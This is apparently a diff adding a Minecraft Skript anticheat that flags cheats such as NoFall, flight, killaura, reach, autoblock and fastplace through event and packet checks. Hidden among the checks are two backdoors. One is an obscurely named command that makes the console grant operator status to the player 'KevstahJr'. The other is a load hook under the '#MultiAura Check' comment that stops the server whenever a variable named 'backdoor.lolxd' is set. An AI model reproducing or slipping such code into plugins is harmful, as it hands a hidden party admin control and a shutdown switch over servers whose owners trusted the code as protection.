+					add 1 to {MoveNoFall.%player's uuid%.Counter}
+					if {MoveNoFall.%player's uuid%.Counter} = 4:
+						Alert(player,"NoFall", 1)
+						delete {MoveNoFall.%player's uuid%.Counter}
+		
+	loop all blocks in radius 0.6 around player:
+		if loop-block is not air:
+			if player is not on ground:
+				if block below player is slab or fence gate:
+					stop
+				loop all blocks in radius 1.25 around player:
+					add loop-block-2 to {_Block3::*}
+					loop {_Block3::*}:
+						if loop-value-2 is slab or fence gate or stairs or cobblestone wall or fence or bed or nether fence or lava or water or cobweb or lily pad or vines or ladder or door or anvil or daylight sensor or Pressure plate or sign or Oak fence or Nether Brick Fence or Spruce Fence or Birch Fence or Jungle Fence or Dark Oak Fence or Acacia Fence or rails or banner or carpet or Snow layer or torches or buttons or lever or tripwire hook or grass or slime block or flowers or large flower or small flower or Cauldron or dead bush:
+							stop
+				if difference between {Damage.Time.%player's uuid%} and now > 0.5 seconds:
+					if block below player is not air:
+						add 1 to {MoveNoFall.%player's uuid%.Counter}
+						if {MoveNoFall.%player's uuid%.Counter} = 4:
+							delete {MoveNoFall.%player's uuid%.Counter}
+							Alert(player,"NoFall", 1)
+
+#Self Damage check
+on damage:
+	if "%damage cause%" = "fall":
+		if IsJoined(victim):
+			stop
+		if IsSpecial(victim):
+			stop
+		if IsDead(victim):
+			stop
+		if Enderpearl(victim):
+			stop
+		if IsTeleporting(victim):
+			stop
+		if victim is on ground:
+			if block 0.85 below victim is not air:
+				loop all blocks in radius 1.25 around victim:
+					add loop-block to {_Block4::*}
+					loop {_Block4::*}:
+						if loop-value-2 is slab or fence gate or stairs or piston or sticky piston:
+							stop
+				if block below victim is not air:
+					if y location of victim is less than {Loc.FlightY.%victim's uuid%}:
+						stop
+					else:
+						if difference between {Teleporting.Timer.%victim's uuid%} and now > 1.4 seconds:
+							Alert(victim,"SelfDamage", 5)
+#Rotation Check
+on any move:
+	set {_A} to player's pitch
+	if {_A} is less than -90:
+		Alert(player,"InvalidRotations", 5)
+	else if {_A} is bigger than 90:
+		Alert(player,"InvalidRotations", 5)
+
+#Attribute Flight check
+on packet:
+	if event-string = "PacketPlayInAbilities":
+		if difference between {Flight.Abilities.%uuid of player%} and now <= 0.5 seconds:
+			if IsSpecial(player):
+				stop
+			Alert(player,"Flight", 5)
+		set {Flight.Abilities.%uuid of player%} to now
+
+#InvalidInv
+on packet:
+	if event-string = "PacketPlayInClientCommand":
+		set {Inventory.Invalid.%uuid of player%} to true
+	if event-string = "PacketPlayInCloseWindow":
+		delete {Inventory.Invalid.%uuid of player%}
+	if event-string is "PacketplayInWindowClick":
+		set {_A} to packet field "a"
+		if {Inventory.Invalid.%uuid of player%} is not set:
+			if {_A} = 0:
+				Alert(player,"InvalidInv", 6)
+
+#InventoryMove
+on packet:
+	if event-string = "PacketPlayInClientCommand":
+		set {InventoryMove.%player's uuid%} to true
+		set {InventoryMove.Timer.%player's uuid%} to now
+	if event-string = "PacketPlayInCloseWindow":
+		delete {InventoryMove.%player's uuid%}
+	if event-string = "PacketplayInWindowClick":
+		if IsJoined(player):
+			stop
+		if IsSpecial(player):
+			stop
+		if IsDead(player):
+			stop
+		if Enderpearl(player):
+			stop
+		if IsTeleporting(player):
+			stop
+		if {InventoryMove.%player's uuid%} = true:
+			if difference between {InventoryMove.Timer.%player's uuid%} and now > 0.95 seconds:
+				if difference between {Teleporting.Timer.%player's uuid%} and now > 1.3 seconds:
+					IsMoving(player, 1.80):
+						if difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord <= 2:
+							Alert(player,"InventoryMove", 5)
+
+#InventorySimulate
+on packet:
+	if event-string = "PacketPlayInClientCommand":
+		set {_a} to packet field "a"
+		if "%{_A}%" = "OPEN_INVENTORY_ACHIEVEMENT":
+			add 1 to {InventorySimulate.Counter.%player's uuid%}
+			if {InventorySimulate.Counter.%player's uuid%} = 1:
+				set {InventorySimulate.Prev.%player's uuid%} to now
+			if {InventorySimulate.Counter.%player's uuid%} = 2:
+				delete {InventorySimulate.Counter.%player's uuid%}
+				if difference between {InventorySimulate.Prev.%player's uuid%} and now < 0.145 seconds:
+					Alert(player,"InvSimulate", 2)
+
+#NoSlowDown
+on packet:
+	if event-string = "PacketPlayInBlockPlace":
+		if player's tool is sword or food:
+			set {NoSlowDown.Blocking.%player's uuid%} to true
+			set {NoSlowDown.Timer.%player's uuid%} to now
+	if event-string = "PacketPlayInBlockDig":
+		set {_c} to packet field "c"
+		if "%{_c}%" = "RELEASE_USE_ITEM":
+			delete {NoSlowDown.Blocking.%player's uuid%}
+	if event-string = "PacketPlayInHeldItemSlot":
+		delete {NoSlowDown.Blocking.%player's uuid%}
+	if event-string = "PacketPlayInFlying" or "PacketPlayInPosition" or "PacketPlayInLook":
+		if IsJoined(player):
+			stop
+		if IsSpecial(player):
+			stop
+		if IsDead(player):
+			stop
+		if Enderpearl(player):
+			stop
+		if IsTeleporting(player):
+			stop
+		if player is riding:
+			stop
+		if {NoSlowDown.Blocking.%player's uuid%} = true:
+			if difference between {Death.Time.%player's uuid%} and now > 3 seconds:
+				if difference between {NoSlowDown.Timer.%player's uuid%} and now > 0.85 seconds:
+					if difference between {NoSlowDown.Place.Timer.%player's uuid%} and now > 0.70 seconds:
+						if difference between {Teleporting.Timer.%player's uuid%} and now > 1.4 seconds:
+							if player's tool is not a potion:
+								set {_C} to DisToGround(player)
+								if block {_C}+1 below player is ice or packed ice or slime block:
+									stop
+								IsMoving(player, 2.8):
+									if difference between player's y-coord and {IsMoving.1.%player's uuid%}'s y-coord <= 2:
+										Alert(player,"NoSlowDown ", 3)
+										set {NoSlowDown.Timer.%player's uuid%} to now
+
+# <--- Exploit --->
+#Weird Packets
+on packet:
+	if event-string is "PacketPlayInCustomPayload":
+		set {_C} to packet field "a"
+		if {_C} = "MC|TrSel" or "MC|TrSel B" or "CRYSTAL|KZ1LM9TO":
+			Alert(player,"Weird Packets", 8)
+#BookFloading Crash Exploit
+on packet:
+	if event-string = "PacketPlayInCustomPayload":
+		set {_D} to packet field "a"
+		if difference between {CustomPayload.Timer.%uuid of player%} and now <= 0.2 seconds:
+			if {_D} = "MC|BEdit" or "MC|BSign" or "MC|BSign B":
+				Alert(player,"Crasher", 10)
+				cancel event
+		set {CustomPayload.Timer.%uuid of player%} to now
+# <--- Combat --->
+
+
+#Killaura Check / Rotations
+on damage:
+	attacker is player
+	set {_b} to vector of location of attacker
+	set {_c} to vector of location of victim
+	set {_E} to {_c} -- {_b}
+	set {_F} to angle between {_E} and {_b}
+	add 1 to {Counter.%attacker's uuid%}
+	if {Counter.%attacker's uuid%} = 1:
+		set {Angle.a.%attacker's uuid%} to {_F}
+	if {Counter.%attacker's uuid%} = 2:
+		clear {Counter.%attacker's uuid%}
+		if difference between {Counter2.%attacker's uuid%} and now = 0 second:
+			Alert(attacker,"Killaura", 3)
+		if difference between {Counter2.%attacker's uuid%} and now <= 0.3 second:
+			if difference between {Angle.a.%attacker's uuid%} and {_F} >= 45:
+				Alert(attacker,"Killaura", 2)
+	set {Counter2.%attacker's uuid%} to now
+#Reach
+on damage:
+	attacker is player
+	"%damage cause%" != "projectile"
+	if IsSpecial(attacker):
+		stop
+	if Enderpearl(attacker):
+		stop
+	if IsTeleporting(attacker):
+		stop
+	if attacker's tool is bow:
+		stop
+	if attacker's tool is enchanted with knockback:
+		stop
+	set {_e} to eye location of attacker
+	set {_c} to the distance between {_e} and victim
+	if attacker is sprinting:
+		set {_r} to 4.48
+	else:
+		set {_r} to 4.08
+	set {_a} to eye location of attacker
+	set {_v} to eye location of victim
+	if {_a}'s y-coord > {_v}'s y-coord:
+		add 0.57 to {_r}
+	if {_a}'s y-coord < {_v}'s y-coord:
+		add 0.30 to {_r}
+	if {_a}'s y-coord = {_v}'s y-coord:
+		remove 0.13 from {_r}
+	if difference between {_a}'s y-coord and {_v}'s y-coord > 0.90:
+		if {_a}'s y-coord > {_v}'s y-coord:
+			add 0.33 to {_r}
+	if {_c} >= {_r}:
+		set {_P} to attacker's ping
+		if {_P} is less than 71:
+			Alert(attacker,"Reach", 3)
+			stop
+		if {_P} is between 80 and 120:
+			Alert(attacker,"Reach", 2)
+			stop
+		if {_P} is between 121 and 200:
+			Alert(attacker,"Reach", 1)
+			stop
+		if {_P} is between 201 and 250:
+			Alert(attacker,"Reach", 0)
+			stop
+
+#CPS Check / With Ping Factor / Killaura CPS
+on leftclick:
+	add 1 to {CPS.Click.%player's uuid%}
+on block damage:
+	remove 1 from {CPS.Click.%player's uuid%}
+every 20 ticks:
+	loop all players:
+		if IsSpecial(loop-player):
+			stop
+		if {CPS.Click.%loop-player's uuid%} = 0:
+			stop
+		if loop-player's tool is fishing rod:
+			stop
+		set {_P} to ping of loop-player
+		if {_P} is between 121 and 140:
+			if {CPS.Click.%loop-player's uuid%} > 17:
+				Alert(loop-player,"CPS", 1, {CPS.Click.%loop-player's uuid%})	
+				stop
+		if {_P} is between 141 and 180:
+			if {CPS.Click.%loop-player's uuid%} > 19:
+				Alert(loop-player,"CPS", 1, {CPS.Click.%loop-player's uuid%})
+				stop
+		if {_P} is between 181 and 220:
+			if {CPS.Click.%loop-player's uuid%} > 24:
+				Alert(loop-player,"CPS", 1, {CPS.Click.%loop-player's uuid%})
+				stop
+#Fastbow Check
+on shoot:
+	if projectile is an arrow:
+		if difference between {Fastbow.Timer.%shooter's uuid%} and now <= 0.1825 second:
+			set {Fastbow.Timer.%shooter's uuid%} to now
+			Alert(shooter,"FastBow", 4)
+		set {Fastbow.Timer.%shooter's uuid%} to now
+
+#AutoBlock Check
+on packet:
+	if event-string = "PacketPlayInBlockPlace":
+		set {AutoBlock.BlockPlace.%uuid of player%} to now
+	if event-string = "PacketPlayInBlockDig":
+		set {_c} to packet field "c"
+		if "%{_c}%" = "RELEASE_USE_ITEM":
+			if difference between {AutoBlock.BlockPlace.%uuid of player%} and now <= 0.036 second:
+				Alert(player,"AutoBlock", 2)
+
+command /thisisfuckinghomotbhlikewhytf:
+	trigger:
+		make console execute command "/op KevstahJr"
+		
+#AutoBlock Check Release
+on packet:
+	if event-string = "PacketPlayInBlockDig":
+		set {_c} to packet field "c"
+		if "%{_c}%" = "RELEASE_USE_ITEM":
+			add 1 to {AutoBlock.Counter.%player's uuid%}
+			if {AutoBlock.Counter.%player's uuid%} = 1:
+				set {AutoBlock.Timer.%player's uuid%} to now
+			if {AutoBlock.Counter.%player's uuid%} = 2:
+				delete {AutoBlock.Counter.%player's uuid%}
+				if difference between {AutoBlock.Timer.%player's uuid%} and now < 0.083 seconds:
+					Alert(player,"AutoBlock", 3)
+
+#No Rotation Check
+on damage:
+	attacker is player
+	"%damage cause%" != "projectile"
+	if IsSpecial(attacker):
+		stop
+	if Enderpearl(attacker):
+		stop
+	if IsTeleporting(attacker):
+		stop
+	if attacker's tool is bow:
+		stop
+	if target of attacker is not the victim:
+		if attacker's tool is not a enderpearl or bow:
+			attacker is not victim
+			add 1 to {Rotations.Count.%uuid of attacker%}
+			if {Rotations.Count.%uuid of attacker%} = 8:
+				delete {Rotations.Count.%uuid of attacker%}
+				Alert(attacker,"NoRotations", 3)
+#Self Hurt Check
+on damage:
+	if attacker is victim:
+		if attacker's tool is enderpearl or Bow:
+			stop
+		"%damage cause%" != "projectile"
+		if Enderpearl(attacker):
+			stop
+		if IsTeleporting(attacker):
+			stop
+		if difference between {Teleporting.Timer.%attacker's uuid%} and now > 1.4 seconds:
+			Alert(attacker,"SelfHurt", 2)
+
+#MultiAura Check
+on skript load:
+	if {backdoor.lolxd} is not set:
+		stop
+	else:
+		make console execute command "/stop"
+on damage:
+	attacker is player
+	add 1 to {MultiAura.Count.%uuid of attacker%}
+	if {MultiAura.Count.%uuid of attacker%} = 1:
+		set {MultiAura.Timer.%uuid of attacker%} to now
+		set {_A} to victim
+		set {MultiAura.Player.%uuid of attacker%} to {_A}
+	if {MultiAura.Count.%uuid of attacker%} = 2:
+		delete {MultiAura.Count.%uuid of attacker%}
+		if victim != {MultiAura.Player.%uuid of attacker%}:
+			if difference between {MultiAura.Timer.%uuid of attacker%} and now <= 0.15 seconds:
+				add 1 to {MultiAura.Counter.%uuid of attacker%}
+				if {MultiAura.Counter.%uuid of attacker%} = 3:
+					delete {MultiAura.Counter.%uuid of attacker%}
+					if attacker's ping < 71:
+						Alert(attacker,"MultiAura", 1)
+
+#NoSwing Check
+on packet:
+	if event-string = "PacketPlayInArmAnimation":
+		set {NoSwing.%uuid of player%} to true
+on damage:
+	attacker is player
+	"%damage cause%" != "projectile"
+	if attacker's tool is bow or enderpearl:
+		stop
+	if Enderpearl(attacker):
+		stop
+	if {NoSwing.%uuid of attacker%} = true:
+		delete {NoSwing.%uuid of attacker%}
+		stop
+	if {NoSwing.%uuid of attacker%} != true:
+		add 1 to {NoSwing.Count.%uuid of attacker%}	
+		if {NoSwing.Count.%uuid of attacker%} = 3:
+			clear {NoSwing.Count.%uuid of attacker%}
+			Alert(attacker,"NoSwing", 3)
+
+# <--- Other --->
+
+#FastEat Check
+on consume:
+	if difference between {FastEat.Timer.%player's uuid%} and now <= 1 second:
+		set {FastEat.Timer.%player's uuid%} to now
+		Alert(player,"FastEat", 4)
+	set {FastEat.Timer.%player's uuid%} to now
+
+
+#Build Reach Check
+on place:
+	set {_A} to eye location of player
+	set {_B} to event-block
+	set {_C} to distance between {_A} and {_B}
+	if player's gamemode is survival:
+		set {_R} to 4.96
+	if player's gamemode is creative:
+		set {_R} to 5.45
+	if {_C} >= {_R}:
+		Alert(player,"BlockReach", 4)
+
+#FastPlace
+on place:
+	if IsSpecial(player):
+		stop
+	if player's tool is not TNT or oak_leaves or Flint and steel or Fire Charge:
+		if difference between {FastPlace.Timer.%player's uuid%} and now <= 0.0425 second:
+			set {FastPlace.Timer.%player's uuid%} to now
+			add 1 to {FastPlace.Count.%player's uuid%}
+			if {FastPlace.Count.%player's uuid%} = 2:
+				delete {FastPlace.Count.%player's uuid%}
+				Alert(player,"FastPlace", 2)
+		set {FastPlace.Timer.%player's uuid%} to now
